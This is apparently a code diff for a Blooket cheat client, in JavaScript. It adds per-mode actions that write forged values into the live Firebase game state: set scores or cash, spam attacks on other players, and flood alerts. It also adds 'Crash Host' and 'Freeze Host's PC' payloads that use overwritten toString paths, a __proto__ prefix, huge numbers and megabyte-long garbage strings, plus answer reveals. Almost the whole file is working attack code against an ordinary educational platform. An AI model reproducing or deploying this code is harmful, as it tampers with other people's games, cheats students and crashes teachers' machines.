+		{ type: "cselect", name: "Distraction",       values: Object.entries({c:"Oh Canada",b:"Blizzard",f:"Fog Spell",d:"Dark & Dusk",w:"Howling Wind",g:"Gift Time!",t:"TREES",s:"Snow Plow",fr:"Use The Force"}).map(([v,n])=>({name:n,value:v})), action: function(v) { setUserVal("tat", v); } },
+	],
+	Cafe: [
+		{ type: "button", name: "First Place",        action: function() { firstPlaceSwitch("ca"); } },
+		{ type: "input",  name: "Set Cash",           action: function(v) { setUserVal("ca", v); } },
+		{ type: "input",  name: "Set Upgrade",        action: function(v) { setUserVal("up", v); } },
+		{ type: "attack", name: "Attack Player",      computed: function() { return Object.keys(gameobject.c); }, action: function(d, atk) { setUserVal("tat", `${d}:${atk}`); } },
+		{ type: "attack", name: "Spam Attack",        computed: function() { return Object.keys(gameobject.c); }, spam: true, action: function(d, atk, n) { for(var i=0;i<n;i++) setUserVal("tat",`${d}:${atk}`); } },
+		{ type: "input",  name: "Flood Alert",        action: function(v) { setUserVal("up", `a:${Date.now()}${new Array(1700).fill(v+" ").join("")}`); } },
+		{ type: "button", name: "Freeze Scoreboard",  action: function(a) { a.frozen=!a.frozen; a.frozen ? setUserVal("tat/t","t") : setUserVal("tat","t"); a.innerText=a.frozen?"Unfreeze Board":"Freeze Scoreboard"; } },
+	],
+	Brawl: [
+		{ type: "button", name: "First Place",        action: function() { firstPlaceSwitch("xp"); } },
+		{ type: "input",  name: "Set XP",             action: function(v) { setUserVal("xp", v); } },
+		{ type: "input",  name: "Set Upgrade",        action: function(v) { setUserVal("up", v); } },
+		{ type: "input",  name: "Flood Alert",        action: function(v) { setUserVal("up", `__proto__:${Date.now()}${new Array(1700).fill(v+" ").join("")}`); } },
+		{ type: "button", name: "Crash Host",         action: function(a) { setUserVal("xp/t", "t"); a.innerText = "Crashing..."; } },
+		{ type: "button", name: "Freeze Scoreboard",  action: function(a) { a.frozen=!a.frozen; a.frozen ? setUserVal("up/t","t") : setUserVal("up","Dark Energy:2"); a.innerText=a.frozen?"Unfreeze Board":"Freeze Scoreboard"; } },
+	],
+	Factory: [
+		{ type: "button", name: "First Place",        action: function() { firstPlaceSwitch("ca"); } },
+		{ type: "input",  name: "Set Cash",           action: function(v) { setUserVal("ca", v); } },
+		{ type: "button", name: "Freeze Scoreboard",  action: function(a) { a.frozen=!a.frozen; a.frozen ? setUserVal("ca/toString","t") : setUserVal("ca",0); a.innerText=a.frozen?"Unfreeze Board":"Freeze Scoreboard"; } },
+		{ type: "staticsel", name: "Distraction",     values: ["dp"], action: function(v) { setUserVal("tat", v); } },
+	],
+	Fish: [
+		{ type: "button", name: "First Place",        action: function() { firstPlaceSwitch("w"); } },
+		{ type: "input",  name: "Set Weight",         action: function(v) { setUserVal("w", v); } },
+		{ type: "input",  name: "Set Fish",           action: function(v) { setUserVal("f", v); } },
+		{ type: "input",  name: "Send Distraction",   action: function(v) { setUserVal("s", true); setUserVal("f", v); } },
+		{ type: "button", name: "Activate Frenzy",    action: function() { setUserVal("s", true); setUserVal("f", "Frenzy"); } },
+		{ type: "button", name: "Freeze Scoreboard",  action: function(a) { a.frozen=!a.frozen; a.frozen ? setUserVal("f/t","t") : setUserVal("f","Old Boot"); a.innerText=a.frozen?"Unfreeze Board":"Freeze Scoreboard"; } },
+	],
+	Dino: [
+		{ type: "input",  name: "Set Fossils",        action: function(v) { setUserVal("f", v); } },
+		{ type: "select", name: "Flag Cheater",       computed: function() { return Object.keys(gameobject.c); }, action: function(d) { setUserVal("tat", `${d}:true`); } },
+		{ type: "staticsel", name: "Set Cheating",    values: ["true","false"], action: function(v) { setUserVal("ic", v); } },
+		{ type: "button", name: "Crash Host",         action: function(a) { setUserVal("f/t", "t"); a.innerText = "Crashing..."; } },
+		{ type: "button", name: "Freeze Scoreboard",  action: function(a) { a.frozen=!a.frozen; a.frozen ? setUserVal("tat/t","t") : setUserVal("tat","t"); a.innerText=a.frozen?"Unfreeze Board":"Freeze Scoreboard"; } },
+	],
+	Defense2: [
+		{ type: "input",  name: "Set Damage",         action: function(v) { setUserVal("d", v); } },
+		{ type: "input",  name: "Set Round",          action: function(v) { setUserVal("r", v); } },
+		{ type: "input",  name: "Flood Alert",        action: function(v) { setUserVal("r", `${Date.now()}${new Array(1700).fill(v+" ").join("")}`); } },
+		{ type: "button", name: "Crash Host",         action: function(a) { setUserVal("d/t", "t"); a.innerText = "Crashing..."; } },
+		{ type: "button", name: "Freeze Scoreboard",  action: function(a) { a.frozen=!a.frozen; a.frozen ? setUserVal("r/toString","t") : setUserVal("r",1); a.innerText=a.frozen?"Unfreeze Board":"Freeze Scoreboard"; } },
+	],
+	Defense: [
+		{ type: "input",  name: "Set Damage",         action: function(v) { setUserVal("d", v); } },
+		{ type: "button", name: "Freeze Scoreboard",  action: function(a) { a.frozen=!a.frozen; a.frozen ? setUserVal("d/toString","t") : setUserVal("d",0); a.innerText=a.frozen?"Unfreeze Board":"Freeze Scoreboard"; } },
+	],
+	Racing: [
+		{ type: "input",  name: "Set Questions Left", action: function(v) { setUserVal("pr", gameobject.s.a - parseInt(v)); } },
+		{ type: "attack", name: "Attack Player",      computed: function() { return Object.keys(gameobject.c); }, action: function(d, atk) { setUserVal("tat", `${d}:${atk}`); } },
+		{ type: "attack", name: "Spam Attack",        computed: function() { return Object.keys(gameobject.c); }, spam: true, action: function(d, atk, n) { for(var i=0;i<n;i++) setUserVal("tat",`${d}:${atk}`); } },
+		{ type: "button", name: "Freeze Board+Attacks", action: function(a) { a.frozen=!a.frozen; a.frozen ? setUserVal("pr/toString","t") : setUserVal("pr",0); a.innerText=a.frozen?"Unfreeze Board":"Freeze Board+Attacks"; } },
+	],
+	Classic: [
+		{ type: "button", name: "Freeze Question",    action: function(a) { a.frozen=!a.frozen; a.frozen ? setUserVal("a/toString","t") : setUserVal("a",1); a.innerText=a.frozen?"Unfreeze Question":"Freeze Question"; } },
+	],
+	Royale: [
+		{ type: "button", name: "Crash Answer",       action: function(a) { a.frozen=!a.frozen; a.frozen ? setVal(`${botinfo.gid}/a/${botinfo.name}/a/toString`,"t") : setVal(`${botinfo.gid}/a/${botinfo.name}/a/toString`,2); a.innerText=a.frozen?"Unsend Crash Answer":"Crash Answer"; } },
+	],
+	Rush: [
+		{ type: "button", name: "First Place",        action: function() { firstPlaceSwitch("bs"); } },
+		{ type: "input",  name: "Set Blooks",         action: function(v) { setUserVal("bs", v); } },
+		{ type: "input",  name: "Set Defense",        action: function(v) { setUserVal("d", v); } },
+		{ type: "adtext", name: "Ad Text",            action: function(txt) { setUserVal("d", new Array(100).fill("1").join("") + new Array(500).fill(txt).join(" ")); } },
+		{ type: "button", name: "Freeze Host's PC",   action: function(a) { setUserVal("bs", 1e307); a.innerText = "Done"; } },
+		{ type: "button", name: "Freeze Scoreboard",  action: function(a) { a.frozen=!a.frozen; a.frozen ? setUserVal("d/toString","t") : setUserVal("d","t"); a.innerText=a.frozen?"Unfreeze Board":"Freeze Scoreboard"; } },
+	],
+	"Rush (teams)": [
+		{ type: "input",  name: "Set Blooks",         action: function(v) { setTeamVal("bs", parseInt(v)); } },
+		{ type: "input",  name: "Set Defense",        action: function(v) { setTeamVal("d", parseInt(v)); } },
+		{ type: "button", name: "Freeze Host's PC",   action: function(a) { setTeamVal("bs", 1e307); a.innerText = "Done"; } },
+	],
+};
+var global = [
+	{ type: "staticsel", name: "Set Blook",   values: blooks, action: function(v) { setUserVal("b", v); } },
+	{ type: "input",     name: "Set Banner",  action: function(v) { setUserVal("bg", v); } },
+	{ type: "button",    name: "Freeze Host", action: function(a) { if(!fvals?.[botinfo?.type]){errorBar("Freeze not available for this mode!");return;} setUserVal(fvals[botinfo.type], makeLongText(1.5e5)); a.innerText="Freezing..."; } },
+	{ type: "button",    name: "Leave Game",  action: function(a) { leaveGame(); finishG(); } },
+];
+
+function updateUnreads() {}
+function sendChatMsg(msg) {}
+function onChat(msg, name) {}
+function handleChat(data) {}
+
+function setTeamVal(path, val) {
+	return setVal(`/${botinfo.gid}/a/${botinfo.name}/${path}`, val);
+}
+//ben sucks at coding guys bro uses base64 for his images
+//if you're reading this I hope blooket goes bankrupt because of all the poor kids you have scammed
+function onUpdateData(datav) {
+	if (!gameobject || !gameobject.s) {
+		onFirstData(datav);
+	} else {
+		onData(datav);
+	}
+	gameobject = datav;
+}
+
+function onBlock(data) { }
+
+function joinGame(code, name, icog) {
+	if (!canJoin) { errorBar("Stop spamming the button!"); return; }
+	canJoin = false;
+	if (botinfo.connecting) { errorBar("Already connecting..."); canJoin = true; return; }
+	oname = name;
+	connect(code, name, icog);
+	setTimeout(() => { canJoin = true; }, 3000);
+}
+
+//setVal(`/${botinfo.gid}/a/${botinfo.name}/d`,56)
+function onFirstData(d) {
+	var gm = d.s?.t || "Unknown";
+	if (gm === "Rush" && d.s?.m === "Teams") gm = "Rush (teams)";
+	window.currentGameMode = gm;
+	console.log("Game type: " + gm);
+
+	// If still in pregame lobby or instructions screen, show waiting UI
+	if (d.stg === "waiting" || d.stg === "instructions") {
+		showWaitingScreen(d.stg);
+		return;
+	}
+
+	// Fetch questions using question set ID from Firebase
+	const questionSetId = d.set || d.s?.set || d.s?.qs;
+	if (questionSetId) {
+		fetchQuestions(questionSetId);
+	} else {
+		renderCheats(gm);
+	}
+}
+
+function showWaitingScreen(stg) {
+	const joinForm = document.getElementById('join-form');
+	if (joinForm) joinForm.style.display = 'none';
+	const nickForm = document.getElementById('nickname-form');
+	if (nickForm) nickForm.style.display = 'none';
+	const bg = document.querySelector('._background_l90pt_1');
+	if (bg) bg.style.display = 'none';
+
+	let existing = document.getElementById('waiting-screen');
+	if (existing) existing.remove();
+
+	const ws = document.createElement('div');
+	ws.id = 'waiting-screen';
+	ws.style.cssText = `position:fixed;inset:0;background:#0bc2cf;display:flex;flex-direction:column;
+		align-items:center;justify-content:center;z-index:500;font-family:Nunito,sans-serif;`;
+
+	const isInstructions = stg === "instructions";
+	ws.innerHTML = `
+		<div style="font-family:'Titan One',sans-serif;font-size:48px;color:white;
+			text-shadow:0 4px rgba(0,0,0,0.2);margin-bottom:16px;">
+			${isInstructions ? 'Look at Host' : 'Waiting for Host'}
+		</div>
+		<div style="font-size:22px;font-weight:700;color:rgba(255,255,255,0.85);margin-bottom:40px;">
+			${isInstructions ? 'Host is showing instructions...' : 'Game hasn\'t started yet'}
+		</div>
+		<div id="waiting-dots" style="display:flex;gap:12px;">
+			${[0,1,2].map(i => `<div style="width:18px;height:18px;border-radius:50%;background:white;
+				opacity:0.4;animation:waitPulse 1.2s ${i*0.4}s infinite ease-in-out;"></div>`).join('')}
+		</div>
+		<style>
+			@keyframes waitPulse {
+				0%,100%{opacity:0.4;transform:scale(1)}
+				50%{opacity:1;transform:scale(1.3)}
+			}
+		</style>
+	`;
+	document.body.appendChild(ws);
+	window._waitingForStart = true;
+}
+
+async function fetchQuestions(setId) {
+	try {
+		const response = await fetch(`${JOIN_URL}?q=${setId}`);
+		if (!response.ok) { renderCheats(window.currentGameMode); return; }
+		const data = await response.json();
+		if (data.questions && Array.isArray(data.questions)) {
+			window.gameQuestions = data.questions;
+			window.currentQuestionIndex = 0;
+			console.log(`? Loaded ${data.questions.length} questions`);
+			renderCheats(window.currentGameMode);
+			startQuestionGame();
+		} else {
+			renderCheats(window.currentGameMode);
+		}
+	} catch (e) {
+		console.error("? fetchQuestions error:", e);
+		renderCheats(window.currentGameMode);
+	}
+}
+
+function startQuestionGame() {
+	// Hide join UI
+	['join-form','nickname-form','cheat-menu'].forEach(id => {
+		const el = document.getElementById(id);
+		if (el) el.style.display = 'none';
+	});
+	const bg = document.querySelector('._background_l90pt_1');
+	if (bg) bg.style.display = 'none';
+
+	// Replace header with game-ui top-bar
+	const header = document.getElementById('main-header');
+	if (header) {
+		header.className = 'top-bar';
+		header.style.cssText = '';
+		header.innerHTML = `
+			<div class="user-info">
+				<button onclick="document.fullscreenElement?document.exitFullscreen():document.documentElement.requestFullscreen()"
+					style="background:none;border:none;color:white;font-size:18px;cursor:pointer;padding:0 8px 0 0;line-height:1;">
+					<i class="fas fa-expand"></i>
+				</button>
+				<span style="font-size:18px;">🔊</span>
+				<span style="font-weight:800;font-size:1.1rem;">${botinfo?.name || 'Player'}</span>
+			</div>
+			<div class="score-info">
+				<span id="gold-count" style="font-weight:800;font-size:1.1rem;">0</span>
+				<img src="/static/img/gold-DFRCSqw9.svg"
+					style="height:34px;width:34px;object-fit:contain;" onerror="this.outerHTML='🪙'">
+			</div>`;
+	}
+
+	// Game container sits below the top-bar
+	let gc = document.getElementById('game-container');
+	if (gc) gc.remove();
+	gc = document.createElement('div');
+	gc.id = 'game-container';
+	gc.style.cssText = 'position:fixed;top:55px;left:0;width:100%;height:calc(100% - 55px);z-index:1;overflow:hidden;';
+	document.body.appendChild(gc);
+
+	window.playerGold = 0;
+	displayQuestion(0);
+}
+
+function toggleCheatDropdown() {
+const panel = document.getElementById('cheat-panel');
+if (panel) panel.classList.toggle('open');
+}
+function showCheatDialog(title, action) {
+	const overlay = document.createElement('div');
+	overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.55);
+		z-index:25000;display:flex;align-items:center;justify-content:center;`;
+
+	const box = document.createElement('div');
+	box.style.cssText = `background:white;border-radius:12px;width:380px;overflow:hidden;
+		box-shadow:0 -7px rgba(0,0,0,0.18) inset,0 0 0 1px rgba(0,0,0,0.08);font-family:Nunito,sans-serif;`;
+	box.innerHTML = `
+		<div style="background:#9a49aa;padding:18px 24px 22px;box-shadow:0 -6px rgba(0,0,0,0.2) inset;">
+			<div style="font-size:26px;font-weight:700;color:white;text-align:center;
+				text-shadow:0 2px rgba(0,0,0,0.2);">${title}</div>
+		</div>
+		<div style="padding:22px;">
+			<input id="cheat-dlg-input" type="number" placeholder="Enter amount"
+				style="width:100%;box-sizing:border-box;padding:12px 16px;font-size:22px;font-weight:700;
+				border:3px solid #dcdcdc;border-radius:8px;font-family:Nunito,sans-serif;color:#3a3a3a;
+				text-align:center;outline:none;margin-bottom:16px;display:block;" />
+			<div style="display:flex;gap:10px;">
+				<button id="cheat-dlg-cancel" style="flex:1;padding:13px;font-size:18px;font-weight:700;
+					background:#e9e9e9;color:#3a3a3a;border:none;border-radius:8px;cursor:pointer;
+					font-family:Nunito,sans-serif;">Cancel</button>
+				<button id="cheat-dlg-apply" style="flex:1;padding:13px;font-size:18px;font-weight:700;
+					background:#0bc2cf;color:white;border:none;border-radius:8px;cursor:pointer;
+					font-family:Nunito,sans-serif;box-shadow:0 -5px rgba(0,0,0,0.18) inset;">Apply</button>
+			</div>
+		</div>`;
+
+	overlay.appendChild(box);
+	document.body.appendChild(overlay);
+
+	const input  = document.getElementById('cheat-dlg-input');
+	const cancel = document.getElementById('cheat-dlg-cancel');
+	const apply  = document.getElementById('cheat-dlg-apply');
+	input.focus();
+	input.onfocus = () => input.style.borderColor = '#9a49aa';
+	input.onblur  = () => input.style.borderColor = '#dcdcdc';
+	cancel.onmouseover = () => cancel.style.background = '#d5d5d5';
+	cancel.onmouseout  = () => cancel.style.background = '#e9e9e9';
+	apply.onmouseover  = () => apply.style.filter = 'brightness(1.1)';
+	apply.onmouseout   = () => apply.style.filter = '';
+	cancel.onclick = () => overlay.remove();
+	apply.onclick  = () => { const v = coerceValue(input.value); if (v !== '') action(v); overlay.remove(); };
+	input.onkeydown = e => { if (e.key === 'Enter') apply.click(); };
+	overlay.onclick = e => { if (e.target === overlay) overlay.remove(); };
+}
+
+// Convert common math notation to readable Unicode
+function parseMath(text) {
+	if (!text) return '';
+	return String(text)
+		// degree: 180\degree or 180° or *180\degree*
+		.replace(/\*?\\degree\*?/g, '°')
+		// fractions: \frac{a}{b} → a/b
+		.replace(/\\frac\{([^}]+)\}\{([^}]+)\}/g, '$1/$2')
+		// square root: \sqrt{x} → √x
+		.replace(/\\sqrt\{([^}]+)\}/g, '√$1')
+		// superscript: x^{2} or x^2 → x²  (handles 0-9)
+		.replace(/\^{?([0-9]+)}?/g, (_, n) => n.split('').map(d => '⁰¹²³⁴⁵⁶⁷⁸⁹'[d]).join(''))
+		// subscript: x_{2} → x₂
+		.replace(/_{([0-9]+)}/g, (_, n) => n.split('').map(d => '₀₁₂₃₄₅₆₇₈₉'[d]).join(''))
+		// pi
+		.replace(/\\pi/g, 'π')
+		// times
+		.replace(/\\times/g, '×')
+		// div
+		.replace(/\\div/g, '÷')
+		// leq / geq
+		.replace(/\\leq/g, '≤')
+		.replace(/\\geq/g, '≥')
+		// neq
+		.replace(/\\neq/g, '≠')
+		// plus-minus
+		.replace(/\\pm/g, '±')
+		// strip remaining backslash commands
+		.replace(/\\[a-zA-Z]+/g, '')
+		// strip leftover braces
+		.replace(/[{}]/g, '')
+		// strip asterisk bold markers
+		.replace(/\*/g, '');
+}
+
+function highlightCorrectAnswer() {
+	document.querySelectorAll('.answer-box').forEach(btn => {
+		if (btn.dataset.correct === 'true') {
+			btn.style.filter = 'brightness(1.4)';
+			btn.style.outline = '4px solid white';
+		} else {
+			btn.style.filter = 'brightness(0.45)';
+		}
+	});
+}
+
+function displayQuestion(index) {
+	const gc = document.getElementById('game-container');
+	if (!gc) return;
+	if (!window.gameQuestions || index >= window.gameQuestions.length) {
+		gc.remove(); return;
+	}
+
+	const q = window.gameQuestions[index];
+	const questionText  = q.question || q.text || '';
+	const answers       = q.answers || [];
+	const correctAnswer = (q.correctAnswers && q.correctAnswers[0]) || q.correctAnswer || '';
+
+	const colorClasses = ['answer-orange','answer-blue','answer-green','answer-red'];
+
+	gc.innerHTML = '';
+	gc.className = '';
+
+	// Question area
+	const qPage = document.createElement('div');
+	qPage.className = 'page active bg-light';
+	qPage.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;';
+
+	const qWrap = document.createElement('div');
+	qWrap.className = 'question-container';
+
+	// Optional image
+	const rawImg = q.image || q.img || null;
+	let qImage = null;
+	if (rawImg) {
+		qImage = typeof rawImg === 'string' && rawImg.startsWith('http') ? rawImg
+			: (rawImg.url || rawImg.src || rawImg.uri || null);
+	}
+	if (qImage) {
+		const imgEl = document.createElement('img');
+		imgEl.src = qImage;
+		imgEl.style.cssText = 'max-height:100%;max-width:30%;object-fit:contain;border-radius:5px;cursor:pointer;margin-right:20px;';
+		imgEl.onclick = () => {
+			const zoom = document.createElement('div');
+			zoom.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center;cursor:pointer;';
+			zoom.innerHTML = `<img src="${qImage}" style="max-width:90%;max-height:90%;object-fit:contain;border-radius:8px;">`;
+			zoom.onclick = () => zoom.remove();
+			document.body.appendChild(zoom);
+		};
+		qWrap.appendChild(imgEl);
+	}
+
+	const qText = document.createElement('div');
+	qText.className = 'question-text';
+	qText.textContent = parseMath(questionText);
+	qWrap.appendChild(qText);
+	qPage.appendChild(qWrap);
+
+	// Answers — split into rows of 2
+	const aWrap = document.createElement('div');
+	aWrap.className = 'answers-container';
+
+	for (let i = 0; i < answers.length; i += 2) {
+		const row = document.createElement('div');
+		row.className = 'answer-row';
+		[answers[i], answers[i+1]].forEach((ans, j) => {
+			if (ans === undefined) return;
+			const idx = i + j;
+			const isCorrect = ans === correctAnswer;
+			const box = document.createElement('div');
+			box.className = `answer-box ${colorClasses[idx % colorClasses.length]}`;
+			box.dataset.correct = isCorrect;
+			box.innerHTML = `<span>${parseMath(ans)}</span>`;
+			box.onclick = () => handleAnswerClick(box, isCorrect);
+			row.appendChild(box);
+		});
+		aWrap.appendChild(row);
+	}
+
+	qPage.appendChild(aWrap);
+	gc.appendChild(qPage);
+}
+
+function handleAnswerClick(box, isCorrect) {
+	document.querySelectorAll('.answer-box').forEach(b => b.style.pointerEvents = 'none');
+
+	if (isCorrect) {
+		box.style.filter = 'brightness(1.3)';
+		if (window.currentGameMode === 'Gold') {
+			setTimeout(showCorrectScreen, 700);
+		} else {
+			setTimeout(showCorrectScreen, 700);
+		}
+	} else {
+		box.style.filter = 'brightness(0.6)';
+		let correctText = '';
+		document.querySelectorAll('.answer-box').forEach(b => {
+			if (b.dataset.correct === 'true') {
+				b.style.filter = 'brightness(1.3)';
+				correctText = b.querySelector('span')?.textContent || '';
+			}
+		});
+		setTimeout(() => showIncorrectScreen(correctText), 700);
+	}
+}
+
+function showCorrectScreen() {
+	const gc = document.getElementById('game-container');
+	gc.innerHTML = '';
+
+	const page = document.createElement('div');
+	page.className = 'page active bg-green feedback-page';
+	page.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;cursor:pointer;display:flex;flex-direction:column;justify-content:center;align-items:center;';
+	page.innerHTML = `
+		<h1 class="feedback-title">CORRECT</h1>
+		<div class="icon-square">
+			<svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round">
+				<polyline points="20 6 9 17 4 12"></polyline>
+			</svg>
+		</div>
+		<div class="click-next"><u>Click Anywhere to Go Next</u></div>
+	`;
+	gc.appendChild(page);
+
+	let canClick = false;
+	setTimeout(() => { canClick = true; }, 800);
+	page.onclick = () => {
+		if (!canClick) return;
+		if (window.currentGameMode === 'Gold') {
+			showTreasureChestSelection();
+		} else {
+			window.currentQuestionIndex++;
+			displayQuestion(window.currentQuestionIndex);
+		}
+	};
+}
+
+function showIncorrectScreen(correctText) {
+	const gc = document.getElementById('game-container');
+	gc.innerHTML = '';
+
+	const page = document.createElement('div');
+	page.className = 'page active bg-red feedback-page';
+	page.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;cursor:pointer;display:flex;flex-direction:column;justify-content:center;align-items:center;';
+	page.innerHTML = `
+		<h1 class="feedback-title">INCORRECT</h1>
+		<div class="icon-square">
+			<svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round">
+				<line x1="18" y1="6" x2="6" y2="18"></line>
+				<line x1="6" y1="6" x2="18" y2="18"></line>
+			</svg>
+		</div>
+		${correctText ? `<div id="correct-ans-reveal" style="color:white;font-size:1.2rem;font-weight:700;margin-top:24px;opacity:0;transition:opacity 0.4s;">
+			Correct: <span style="background:rgba(255,255,255,0.2);padding:3px 12px;border-radius:6px;">${correctText}</span>
+		</div>` : ''}
+		<div class="click-next"><u>Click Anywhere to Go Next</u></div>
+	`;
+	gc.appendChild(page);
+
+	if (correctText) {
+		setTimeout(() => {
+			const el = document.getElementById('correct-ans-reveal');
+			if (el) el.style.opacity = '1';
+		}, 500);
+	}
+
+	let canClick = false;
+	setTimeout(() => { canClick = true; }, 1000);
+	page.onclick = () => {
+		if (!canClick) return;
+		window.currentQuestionIndex++;
+		displayQuestion(window.currentQuestionIndex);
+	};
+}
+
+function showTreasureChestSelection() {
+	const gc = document.getElementById('game-container');
+	gc.innerHTML = '';
+
+	const page = document.createElement('div');
+	page.className = 'page active bg-pattern';
+	page.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;';
+
+	const titleWrap = document.createElement('div');
+	titleWrap.className = 'title-container';
+	const title = document.createElement('h1');
+	title.className = 'title-red-box';
+	title.textContent = 'Choose a Chest!';
+	titleWrap.appendChild(title);
+	page.appendChild(titleWrap);
+
+	const chestRow = document.createElement('div');
+	chestRow.className = 'chest-container';
+
+	const chests = [
+		{ gold: 10,  img: '/static/img/chest3-oiu39qh7.svg' },
+		{ gold: 100, img: '/static/img/chest2-DgTYmzNf.svg' },
+		{ gold: 25,  img: '/static/img/chest1-C_Kgg2Ui.svg' },
+	];
+
+	chests.forEach(c => {
+		const wrap = document.createElement('div');
+		wrap.className = 'chest-wrapper';
+		const img = document.createElement('img');
+		img.src = c.img;
+		img.className = 'chest-img';
+		img.onerror = () => { img.style.display = 'none'; };
+		wrap.appendChild(img);
+		wrap.onclick = () => selectChest(c.gold);
+		chestRow.appendChild(wrap);
+	});
+
+	page.appendChild(chestRow);
+	gc.appendChild(page);
+}
+
+function selectChest(goldAmount) {
+	window.playerGold = (window.playerGold || 0) + goldAmount;
+	const goldEl = document.getElementById('gold-count');
+	if (goldEl) goldEl.textContent = window.playerGold;
+
+	const gc = document.getElementById('game-container');
+	gc.innerHTML = '';
+
+	const page = document.createElement('div');
+	page.className = 'page active bg-pattern';
+	page.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;';
+
+	// Use a wrapper that handles the pop animation without fighting translate
+	const wrap = document.createElement('div');
+	wrap.style.cssText = 'display:flex;flex-direction:column;align-items:center;animation:popIn 0.5s cubic-bezier(0.175,0.885,0.32,1.275);';
+	wrap.innerHTML = `
+		<div class="reward-icon">💰</div>
+		<div class="reward-amount">+ ${goldAmount} Gold</div>
+	`;
+	page.appendChild(wrap);
+	gc.appendChild(page);
+
+	setTimeout(() => {
+		window.currentQuestionIndex++;
+		displayQuestion(window.currentQuestionIndex);
+	}, 900);
+}
+
+function onData(d) {
+	if (!d) {
+		console.log("Game disconnected!");
+		errorBar("Game crashed!");
+		leaveGame();
+		finishG();
+		return;
+	}
+	procData(d);
+
+	// Detect game start: was waiting/instructions, now moved to active game
+	if (window._waitingForStart) {
+		const prevStg = gameobject?.stg;
+		const newStg  = d?.stg;
+		const wasWaiting = prevStg === "waiting" || prevStg === "instructions";
+		const nowActive  = newStg !== "waiting" && newStg !== "instructions" && newStg !== "fin";
+
+		// Also handle: instructions → waiting (host went back) — update the screen text
+		if (prevStg === "waiting" && newStg === "instructions") {
+			const ws = document.getElementById('waiting-screen');
+			if (ws) {
+				const title = ws.querySelector('div');
+				if (title) title.textContent = 'Look at Host';
+				const sub = ws.querySelectorAll('div')[1];
+				if (sub) sub.textContent = 'Host is showing instructions...';
+			}
+		}
+
+		if (wasWaiting && nowActive) {
+			window._waitingForStart = false;
+			const ws = document.getElementById('waiting-screen');
+			if (ws) ws.remove();
+			// Now kick off the game
+			const questionSetId = d.set || d.s?.set || d.s?.qs;
+			if (questionSetId) {
+				fetchQuestions(questionSetId);
+			} else {
+				renderCheats(window.currentGameMode);
+			}
+		}
+	}
+
+	if (gameobject.c?.[botinfo.name]) {
+		if (gameobject.c[botinfo.name].tat && !d.c[botinfo.name]?.tat) {
+			errorBar("Attack complete!");
+		}
+	}
+	if (d.stg === "fin" && botinfo.connected) {
+		botinfo.connected = false;
+		leaveGame();
+		finishG();
+		return;
+	}
+}
+
+function procData(data) {
+	// Sync gold display from live Firebase data
+	if (data?.c?.[botinfo.name]) {
+		const p = data.c[botinfo.name];
+		const val = p.g ?? p.cr ?? p.d ?? p.xp ?? p.ca ?? p.t ?? p.w ?? p.f ?? null;
+		if (val !== null) {
+			const el = document.getElementById('gold-count');
+			if (el) el.textContent = Number(val).toLocaleString();
+		}
+	}
+}
+
+function leaveGame() {
+	if (botinfo.connected) {
+		setUserVal("", {});
+		botinfo.fbdb = false;
+		deleteApp(botinfo.liveApp);
+		botinfo.connected = false;
+		botinfo.liveApp = false;
+		gameobject = {};
+		updateStatus("Ready");
+	}
+}
+
+function getTime() {
+	var v = (Date.now() - new Date(gameobject.s.d).getTime()) / 60000;
+	return Math.floor(v) + ":" + (Math.floor(v * 60) % 60);
+}
+
+var chars = ["‮","俿","佒","⾟","็","็","็","็","็","็","俱","俲"];
+function makeLongText(a) { return new Array(a).fill().map(() => chars[Math.floor(Math.random()*chars.length)]).join(""); }
+function genCursed() { return makeLongText(3e6); }
+
+//DOM FUNCTIONS:
+// errorBar - show a notification at the bottom of the screen
+function errorBar(msg) {
+	var e = document.getElementById('error-bar');
+	if (!e) {
+		e = document.createElement('div');
+		e.id = 'error-bar';
+		e.className = 'errorBar';
+		document.body.appendChild(e);
+	}
+	e.innerText = msg;
+	e.classList.add('show');
+	clearTimeout(e._t);
+	e._t = setTimeout(() => e.classList.remove('show'), 4000);
+}
+
+// Expose joinGame globally for index.html
+window.joinGame = joinGame;
+
+function createNormText(text) { var a=document.createElement("div"); a.className="normtext"; a.innerText=text; return a; }
+function createCheatContainer() { var a=document.createElement("div"); a.className="cheatcontainer"; return a; }
+
+function updateStatus(text) {
+	const s = document.getElementById("status");
+	if (s) s.innerText = "Status: " + text;
+	if (text !== "Ready" && text !== "Connected to game") console.log("Status: " + text);
+}
+
+function createButton(text, clickaction) {
+	var button = document.createElement("button");
+	button.innerText = text;
+	button.addEventListener("click", function () {
+		clickaction(button);
+	});
+	return button;
+}
+
+function renderCheats(gm) {
+	botinfo.type = gm;
+
+	const gameContainer = document.getElementById('cheat-items-game');
+	const globalContainer = document.getElementById('cheat-items-global');
+	if (!gameContainer) return;
+
+	gameContainer.innerHTML = '';
+	if (globalContainer) globalContainer.innerHTML = '';
+
+	function mkEl(cheat) {
+		var el;
+		switch (cheat.type) {
+			case 'button':    el = createButton(cheat.name, cheat.action); break;
+			case 'input':     el = createInp(cheat.name, cheat.action); break;
+			case 'select':    el = createSel(cheat.name, cheat.computed, cheat.action); break;
+			case 'staticsel': el = createStaticSel(cheat.name, cheat.values, cheat.action); break;
+			case 'adtext':    el = createAdText(cheat.name, cheat.playerSelect, cheat.action); break;
+			case 'attack':    el = createAttack(cheat.name, cheat.computed, cheat.spam, cheat.action); break;
+			case 'cselect':   el = createCsSel(cheat.name, cheat.values, cheat.action); break;
+			default:          el = createButton(cheat.name, cheat.action);
+		}
+		el.className = 'cheat-item';
+		el.style.cssText = ''; // clear any inline styles from oldhacks builders
+		return el;
+	}
+
+	const gameCheats = cheats[gm] || [];
+	if (gameCheats.length === 0) {
+		const msg = document.createElement('div');
+		msg.style.cssText = 'grid-column:1/-1;text-align:center;color:#aaa;font-size:13px;padding:8px;font-family:Nunito,sans-serif;';
+		msg.textContent = gm === 'Unknown' ? 'Join a game to see cheats' : `No cheats for ${gm}`;
